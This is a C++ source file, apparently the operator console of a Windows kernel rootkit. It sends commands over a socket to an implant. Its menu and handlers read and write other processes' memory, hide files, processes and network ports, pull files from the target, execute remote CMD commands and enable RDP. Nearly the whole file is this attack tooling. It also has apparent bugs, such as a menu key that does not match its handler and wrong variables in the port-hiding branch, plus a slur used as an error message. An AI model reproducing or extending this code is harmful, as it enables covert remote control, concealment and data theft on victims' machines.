#include "communication.h"


void TripleManipulationInput(int* Object, int* RemoveIndex, const char* ManipulationType, NTSTATUS* RequestStatus) {
	char InputStr[1024] = { 0 };
	char ReqType = '\0';
	if (Object != NULL && RemoveIndex != NULL && ManipulationType != NULL && RequestStatus != NULL) {
		printf("Write type of %s manipulation (r = remove hidden %s, l = list hidden %ses, else = add hidden %s) ->",
			ManipulationType, ManipulationType, ManipulationType, ManipulationType);
		std::cin >> ReqType;
		if (ReqType != 'l') {
			ResetString(InputStr);
			printf("Write number of %s to remove/add ->", ManipulationType);
			std::cin >> InputStr;
			*Object = GetNumFromString(InputStr);
			while (*Object == -1 || *Object == 0 || *Object >= 65535) {
				ResetString(InputStr);
				printf("Write number of %s to remove/add ->", ManipulationType);
				std::cin >> InputStr;
				*Object = GetNumFromString(InputStr);
			}
		}
		switch (ReqType) {
		case 'r':
			if (strcmp(ManipulationType, "process") == 0) {
				*RequestStatus = UNHIDE_PROCESS;
			}
			else {
				*RequestStatus = UNHIDE_PORT;  // For now the only other one
			}
			ResetString(InputStr);
			printf("Unhide %s by index in list (I) or by number (else) ->", ManipulationType);
			std::cin >> ReqType;
			if (ReqType == 'I') {
				printf("Write index of %s to remove (make sure to use option l first) ->", ManipulationType);
				std::cin >> InputStr;
				*RemoveIndex = GetNumFromString(InputStr);
				while (*RemoveIndex == -1) {
					ResetString(InputStr);
					printf("Write index of %s to remove (make sure to use option l first) ->", ManipulationType);
					std::cin >> InputStr;
					*RemoveIndex = GetNumFromString(InputStr);
				}
			}
			break;

		case 'l':
			if (strcmp(ManipulationType, "process") == 0) {
				*RequestStatus = SHOWHIDDEN_PROCESS;
			}
			else {
				*RequestStatus = SHOWHIDDEN_PORTS;  // For now the only other one
			}
			printf("No additional parameters for listing existing dynamically hidden %ses\n", ManipulationType);
			break;
		default:
			if (strcmp(ManipulationType, "process") == 0) {
				*RequestStatus = HIDE_PROCESS;
			}
			else {
				*RequestStatus = HIDE_PORT;  // For now the only other one
			}
			break;
		}
	}
}


int ReqAct(NETWORK_INFO Sender, NETWORK_INFO Server) {
	PASS_DATA result;
	int totallen = 0;
	int RemoveIndex = -1;
	int RemoveProcessId = -1;
	int RemovePortNumber = -1;
	char ReqType = '\0';
	char SenderIP[INET6_ADDRSTRLEN] = { 0 };
	char InputStr[1024] = { 0 };
	WCHAR WideFilePath[1024] = { 0 };
	ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
	ROOTKIT_OPERATION MedStat = RKOP_NOOPERATION;
	BOOL Handled = FALSE;
	BOOL IsValidPath = FALSE;
	BOOL FileOprSuccess = FALSE;
	BOOL ProcessOprSuccess = FALSE;
	BOOL PortOprSuccess = FALSE;
	BOOL OperationResult = FALSE;
	ROOTKIT_MEMORY SystemInfo;
	ULONG WriteSize = 0;
	ULONG ReadSize = 0;
	ULONG AllocSize = 0;
	ULONG ZeroBits = 0;
	ULONG64 WriteAddr;
	ULONG64 WriteFromAddr;
	ULONG64 ReadAddr;
	ULONG64 AllocAddr;
	PVOID BaseAddr;
	PVOID ReadBuf;
	PVOID MdlName = NULL;
	PVOID SemiMdl = NULL;
	PVOID WriteBuf = NULL;
	PVOID DbgMsg = NULL;
	char ProcessorsNum = 8;
	char InfoTypes[100];
	ROOTKIT_UNEXERR Err = successful;
	NTSTATUS FileHideReq = STATUS_UNSUCCESSFUL;
	NTSTATUS ProcessHideReq = STATUS_UNSUCCESSFUL;
	NTSTATUS PortHideReq = STATUS_UNSUCCESSFUL;


	while (TRUE) {
		// Get user input for the performing operation of the rootkit -
		switch (ReturnInput("Choose NOW ROOTKIT : \n"
			"W. Write into process memory\n"
			"R. Read from process memory\n"
			"B. Get Module base address\n"
			"S. Get system information\n"
			"A. Allocate specific memory region in a specific process\n"
			"H. Dynamically hidden files/folders manipulation\n"
			"P. Dynamically hidden processes manipulation\n"
			"p. Dynamically hidden port manipulation\n"
			"G. Get file from target machine\n"
			"X. Execute CMD command on the target machine\n"
			"r. Initiate an RDP server on the target machine\n")) {
		case 'W': RootStat = RKOP_WRITE; break;

		case 'R': RootStat = RKOP_READ; break;

		case 'B': RootStat = RKOP_MDLBASE; break;

		case 'S': RootStat = RKOP_SYSINFO; break;

		case 'A': RootStat = RKOP_PRCMALLOC; break;

		case 'H': RootStat = RKOP_HIDEFILE; break;

		case 'P': RootStat = RKOP_HIDEPROC; break;

		case 'p': RootStat = RKOP_HIDEPORT; break;

		case 'G': RootStat = RKOP_GETFILE; break;

		case 'X': RootStat = RKOP_EXECOMMAND; break;

		case 'd': RootStat = RKOP_ACTIVATERDP; break;

		default:
			printf("Retard\n");
			printf("Quit?\n");
			std::cin >> ReqType;
			if (ReqType == 'y') {
				closesocket(Sender.AsoSock);
				return -1;
			}

			RootStat = RKOP_NOOPERATION;
			Handled = FALSE;
			break;
		}


		if (RootStat == RKOP_NOOPERATION) {
			goto ErrorCheck;
		}

		// Confirm the status of the operation (RKOP/non-RKOP) -
		result = SendData(Sender.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
		if (result.err || result.value != sizeof(RootStat)) {
			goto ErrorCheck;
		}
		result = RecvData(Sender.AsoSock, sizeof(MedStat), &MedStat, FALSE, 0);
		if (!result.err && result.value == sizeof(MedStat)) {
			if (MedStat == RKOP_TERMINATE) {
				printf("Medium requested termination..\n");
				result = SendData(Sender.AsoSock, &MedStat, sizeof(MedStat), FALSE, 0);
				closesocket(Sender.AsoSock);
				return -1;
			}
			if (MedStat != RootStat) {
				printf("Did not return correct operation regular (expected %lu but got %lu instead)\n", RootStat, MedStat);
				RootStat = RKOP_NOOPERATION;
			}
			if (result.err || result.value != sizeof(RootStat)) {
				goto ErrorCheck;
			}

			Handled = FALSE;
			printf("Write main string for the operation (process name, mymyymym to specify medium process, file path, command to execute..)->\n");
			std::cin >> InputStr;

			MdlName = malloc(strlen(InputStr) + 1);
			if (MdlName == NULL) {
				printf("Cannot allocate memory for main process name string buffer\n");
				RootStat = RKOP_NOOPERATION;
			}
			else {
				memcpy(MdlName, InputStr, strlen(InputStr) + 1);
				printf("Main string - %s\n", (char*)MdlName);
			}

			switch (RootStat) {
			case RKOP_WRITE:

				// Write into process virtual memory (from user supplied buffer / another process) -
				ResetString(InputStr);
				printf("Write secondary process name for the operation (relevant process name, mymyymym for medium process or regular for regular buffer passing), no systemspace->\n");
				std::cin >> InputStr;

				SemiMdl = malloc(strlen(InputStr) + 1);
				if (SemiMdl == NULL) {
					printf("Cannot allocate memory for secondary process name string buffer\n");
					Err = memalloc;
				}
				else {
					memcpy(SemiMdl, InputStr, strlen(InputStr) + 1);
					printf("Secondary request process name - %s\n", (char*)SemiMdl);
				}

				printf("Write ZeroBits value for allocation for operation (value < 21)->\n");
				std::cin >> ZeroBits;
				if (ZeroBits >= 21 || ZeroBits < 0) {
					ZeroBits = 0;
				}

				if (strcmp(InputStr, "regular") == 0 && Err == successful) {
					printf("Write value to write into memory of target (string for now) ->\n");
					std::cin >> InputStr;
					WriteSize = (ULONG)strlen(InputStr) + 1;
					WriteBuf = malloc(WriteSize);
					if (WriteBuf == NULL) {
						printf("Cannot allocate memory for writing buffer\n");
						Err = memalloc;
					}
					else {
						memcpy(WriteBuf, InputStr, WriteSize);
					}
				}

				else {
					if (Err == successful) {
						printf("Write address to write from memory into target (ULONG64 value, no systemspace) ->\n");
						std::cin >> WriteFromAddr;
						WriteBuf = (PVOID)WriteFromAddr;
						printf("Write size of data to write from %s to %s (ULONG value) ->\n", (char*)SemiMdl, (char*)MdlName);
						std::cin >> WriteSize;
					}
				}

				if (Err == successful) {
					printf("Write address to write into in memory of target (ULONG64 value, no systemspace) ->\n");
					std::cin >> WriteAddr;
				}

				else {
					WriteAddr = NULL;
				}

				if (!DriverCalls::WriteToRootkKMD((PVOID)WriteAddr, WriteBuf, WriteSize, (char*)MdlName, (char*)SemiMdl, Sender.AsoSock, Err, (ULONG_PTR)ZeroBits)) {
					printf("Write function did not succeed\n");
					if (WriteBuf != NULL && strcmp((char*)SemiMdl, "regular") == 0) {
						free(WriteBuf);
					}
					break;
				}
				else {
					printf("Write function succeeded\n");
					if (WriteBuf != NULL && strcmp(InputStr, "regular") == 0) {
						free(WriteBuf);
					}
					break;
				}

			case RKOP_READ:

				// Read from process virtual memory -
				printf("Write amount of bytes to read ->\n");
				std::cin >> ReadSize;

				ReadBuf = malloc(ReadSize);
				if (ReadBuf == NULL) {
					printf("Cannot allocate memory for reading buffer\n");
					Err = memalloc;
				}

				if (Err == successful) {
					printf("Write the address to read from (ULONG64 value, no systemspace) ->\n");
					std::cin >> ReadAddr;
				}
				else {
					ReadAddr = NULL;
				}

				if (!DriverCalls::ReadFromRootkKMD((PVOID)ReadAddr, ReadBuf, ReadSize, (char*)MdlName, Sender.AsoSock, Err)) {
					printf("Read function did not succeed\n");
					free(ReadBuf);
					break;
				}

				printf("Read function did succeed, printing values as string (char *) -> %s\n", (char*)ReadBuf);
				free(ReadBuf);
				break;

			case RKOP_MDLBASE:

				// Get the base address of a process module (executable) in memory -
				printf("No extra buffer parameters for getting the module base..\n");
				BaseAddr = DriverCalls::GetModuleBaseRootkKMD((char*)MdlName, Sender.AsoSock);
				if (BaseAddr == NULL) {
					printf("Module base operation failed\n");
					break;
				}

				printf("Module base operation succeeded -> %p\n", BaseAddr);
				break;

			case RKOP_SYSINFO:

				// return specific information about the target system (with ZwQuerySystemInformation) -
				printf("Write system info request types string (only from allowed characters):\n");
				printf("r - Registry\nb - Basic\np - Performance\nt - TimeOfDay\nc - Processes (and threads)\nP - Processor Performance\ni - Interrupts (from all processors, array of 8)\n");
				printf("e - Exceptions (of all processors, array of 8)\nL - Lookaside\nI - Code Integrity\n");
				std::cin >> InfoTypes;

				if (!DriverCalls::GetSystemInfoRootkKMD(InfoTypes, Sender.AsoSock, &SystemInfo, (char*)MdlName, &ProcessorsNum)) {
					printf("Get system information did not work\n");
					break;
				}

				printf("Get system information succeeded\n");
				break;

			case RKOP_PRCMALLOC:

				// Allocate memory in a specific process (and leave it committed for now) -
				printf("Write amount of bytes to allocate ->\n");
				std::cin >> AllocSize;
				printf("Write the address to allocate in memory (ULONG64 value, no systemspace) ->\n");
				std::cin >> AllocAddr;
				printf("Write ZeroBits value for allocation for operation (value < 21)->\n");
				std::cin >> ZeroBits;
				if (ZeroBits >= 21 || ZeroBits < 0) {
					ZeroBits = 0;
				}

				AllocAddr = (ULONG64)DriverCalls::SpecAllocRootkKMD((PVOID)AllocAddr, AllocSize, (char*)MdlName, Sender.AsoSock, Err, (ULONG_PTR)ZeroBits);
				if (AllocAddr == NULL) {
					printf("Allocation function did not succeed\n");
					break;
				}
				printf("Allocation function succeeded (%p)\n", (PVOID)AllocAddr);
				break;

			case RKOP_HIDEFILE:

				// Request for hiding file/folder, get type of file manipulation:
				printf("Write type of manipulation (r = remove hidden file, l = list hidden files, else = add hidden file) ->");
				std::cin >> ReqType;
				switch (ReqType) {
				case 'r':
					FileHideReq = UNHIDE_FILEFOLDER;
					ResetString(InputStr);
					printf("Write index of file to remove (make sure to use option l first) ->");
					std::cin >> InputStr;
					RemoveIndex = GetNumFromString(InputStr);
					while (RemoveIndex == -1) {
						ResetString(InputStr);
						printf("Write index of file to remove (make sure to use option l first) ->");
						std::cin >> InputStr;
						RemoveIndex = GetNumFromString(InputStr);
					}
					break;
				case 'l':
					FileHideReq = SHOWHIDDEN_FILEFOLDER;
					printf("No additional parameters for listing existing dynamically hidden files\n");
					break;
				default:
					FileHideReq = HIDE_FILEFOLDER;
					ResetString(InputStr);
					while (!IsValidPath) {
						printf("Write use of path (g = general name, block all occurences, else = specific path) ->");
						std::cin >> ReqType;
						printf("Write path to hiding file (syntax: \\path\\to\\fileorfolder, to cancel write |||***|||) ->\n");
						std::cin >> InputStr;
						if (strcmp(InputStr, "|||***|||") == 0) {
							ResetString(InputStr);
							continue;
						}
						IsValidPath = ValidateFileReqPath(InputStr, ReqType);
						while (!IsValidPath) {
							ResetString(InputStr);
							printf("Write path to hiding file (syntax: \\path\\to\\fileorfolder, to cancel write |||***|||) ->\n");
							std::cin >> InputStr;
							if (strcmp(InputStr, "|||***|||") == 0) {
								ResetString(InputStr);
								break;
							}
							IsValidPath = ValidateFileReqPath(InputStr, ReqType);
						}
					}
					IsValidPath = FALSE;


					// Use a special buffer for the path passed to the driver (and convert to WCHAR):
					CharpToWcharp(InputStr, WideFilePath);
					wprintf(L"Path to hiding file/folder - %s\n", WideFilePath);
					break;
				}

				FileOprSuccess = DriverCalls::HideFileRootkKMD((char*)MdlName, WideFilePath, RemoveIndex, Sender.AsoSock, FileHideReq);
				if (FileOprSuccess) {
					printf("Files/folders manipulation succeeded!\n");
				}
				else {
					printf("Files/folders manipulation did not succeed\n");
				}
				RemoveIndex = -1;
				FileOprSuccess = FALSE;
				FileHideReq = STATUS_UNSUCCESSFUL;
				WideResetString(WideFilePath);
				break;

			case RKOP_HIDEPROC:

				// Request for hiding processes, get type of process manipulation:
				TripleManipulationInput(&RemoveProcessId, &RemoveIndex, "process", &ProcessHideReq);
				ProcessOprSuccess = DriverCalls::HideProcessRootkKMD((char*)MdlName, TRUE, RemoveProcessId, RemoveIndex, Sender.AsoSock, ProcessHideReq);
				if (ProcessOprSuccess) {
					printf("Processes manipulation succeeded!\n");
				}
				else {
					printf("Processes manipulation did not succeed\n");
				}
				RemoveIndex = -1;
				ProcessOprSuccess = FALSE;
				ProcessHideReq = STATUS_UNSUCCESSFUL;
				break;

			case RKOP_HIDEPORT:
				
				// Request for hiding ports, get type of port manipulation:
				TripleManipulationInput(&RemovePortNumber, &RemoveIndex, "port", &PortHideReq);
				PortOprSuccess = DriverCalls::HidePortConnectionRootkKMD((char*)MdlName, RemovePortNumber, RemoveIndex, Sender.AsoSock, ProcessHideReq);
				if (ProcessOprSuccess) {
					printf("Ports manipulation succeeded!\n");
				}
				else {
					printf("Ports manipulation did not succeed\n");
				}
				RemoveIndex = -1;
				PortOprSuccess = FALSE;
				PortHideReq = STATUS_UNSUCCESSFUL;
				break;

			case RKOP_GETFILE:
				
				// Get file from target machine:
				OperationResult = GeneralRequests::DownloadFileRequest((char*)MdlName, Sender.AsoSock);
				if (!OperationResult) {
					printf("Failed operation - %d\n", GetLastError());
				}
				else {
					printf("Operation succeeded\n");
				}
				break;

			case RKOP_EXECOMMAND:

				// Execute cmd command:
				OperationResult = GeneralRequests::RemoteCommandRequest((char*)MdlName, Sender.AsoSock);
				if (!OperationResult) {
					printf("Failed operation - %d\n", GetLastError());
				}
				else {
					printf("Operation succeeded\n");
				}
				break;

			case RKOP_ACTIVATERDP:

				// Activate RDP service:
				OperationResult = GeneralRequests::ActivateRDPRequest(Sender.AsoSock, (char*)MdlName);
				if (!OperationResult) {
					printf("Failed operation - %d\n", GetLastError());
				}
				else {
					printf("Operation succeeded\n");
				}
				break;
			}
			ResetString(InputStr);
			RootStat = RKOP_NOOPERATION;
			Err = successful;
		}
	}

	ErrorCheck:
	if (RootStat != RKOP_NOOPERATION && result.err) {
		printf("An error occurred\n");
		if (result.Term) {
			printf("Critical socket error occurred, quitting..\n");
			closesocket(Sender.AsoSock);
			return -1;
		}
	}

	// Clean important variables and network stack from last request -
	CleanNetStack(Sender.AsoSock);
	printf("FINISH MEDIUM FUNCTION FINISHED\n");
	printf("FINISH REQUESTER FUNCTION ITERATION COMPLETED\n");
	closesocket(Sender.AsoSock);
	return 0;
}